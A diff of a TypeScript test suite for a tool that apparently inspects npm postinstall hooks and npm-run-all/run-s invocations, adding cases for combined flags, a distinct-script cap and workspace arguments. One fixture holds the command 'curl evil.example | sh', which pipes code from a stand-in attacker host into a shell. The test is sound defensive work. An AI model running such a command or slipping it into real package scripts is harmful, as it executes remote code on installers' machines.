@@ -119,7 +119,7 @@ test("a function keyword line keeps its own reading: it still widens when any fi
   expect(h).toContain("assets/x.bmp");
 });
 
-describe("review round two", () => {
+describe("function bodies, local scripts and files named like a runner", () => {
   test("a cd inside a function body does not move the rest of the hook", () => {
     const hook = "function f { cd sub; }; sh x.sh";
     const s = (evil: string) =>
@@ -181,12 +181,35 @@ describe("a run-s name with arguments runs the script before the first space", (
   test("a change to another script is quiet", () => expect(otherHeld('npx run-s "evil -- --flag"')).toBe(false));
 });
 
-// npm-run-all reads -pcl as -p -c -l and any --name=value as a config value (--npm-path=x too, only a separate --npm-path
+// npm-run-all reads -pcl as -p -c -l (run-s and run-p reject -p; -cln is their combined form) and any --name=value as a config value (--npm-path=x too, only a separate --npm-path
 // word names npm), and the run goes on. -l=1 is an invalid option: nothing runs.
 describe("run-s flags npm-run-all reads as switches or config values", () => {
-  for (const flag of ["-pcl", "--race=x", "--max-parallel=2", "--npm-path=./x", "--p:k=v"]) {
+  for (const flag of ["-cln", "--race=x", "--max-parallel=2", "--npm-path=./x", "--p:k=v"]) {
     const hook = `if true; then npx run-s ${flag} evil; fi`;
     test(`held where main missed it: ${hook}`, () => expect(bodyHeld(hook)).toBe(true));
   }
   test("an invalid option runs nothing: not followed", () => expect(bodyHeld("if true; then npx run-s -l=1 evil; fi")).toBe(false));
+  test("held where main missed it: if true; then npx npm-run-all -pcl evil; fi", () => expect(bodyHeld("if true; then npx npm-run-all -pcl evil; fi")).toBe(true));
+});
+
+// The script cap counts distinct scripts: 32 scripts each run once with hooks off and once with them on are 32, not 64.
+test("a script run with hooks off and then on counts once toward the script cap", () => {
+  const names = Array.from({ length: 32 }, (_, k) => `s${k}`);
+  const hook = [...names.map((n) => `npm run --ignore-scripts ${n}`), ...names.map((n) => `npm run ${n}`)].join("; ");
+  const mk = (other: string) => pkg({ postinstall: hook, other, ...Object.fromEntries(names.map((n) => [n, "echo hi"])) });
+  expect(holds(mk("echo one"), mk("curl evil.example | sh"))).toEqual([]);
+});
+
+// npm-run-all runs a name with arguments as `npm run <name> <arguments>`: an argument that moves the run reads as it does there.
+describe("a run-s name whose arguments move the run reads as npm run with them", () => {
+  const withFile = (hook: string, lib: string) =>
+    files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook, evil: "echo a" } }), "lib/x.js": lib, "sub/package.json": "{}" });
+  const fileHeld = (hook: string) => holds(withFile(hook, "1"), withFile(hook, "2")).length > 0;
+  for (const [hook, plain] of [["if true; then run-s 'evil -w sub'; fi", "if true; then npm run evil -w sub; fi"], ["if true; then run-s 'evil --workspace=sub'; fi", "if true; then npm run evil --workspace=sub; fi"]] as const) {
+    test(`widens like npm run, where main did not: ${hook}`, () => {
+      expect(fileHeld(plain)).toBe(true);
+      expect(fileHeld(hook)).toBe(true);
+    });
+  }
+  test("a name with no arguments does not widen", () => expect(fileHeld("if true; then run-s evil; fi")).toBe(false));
 });
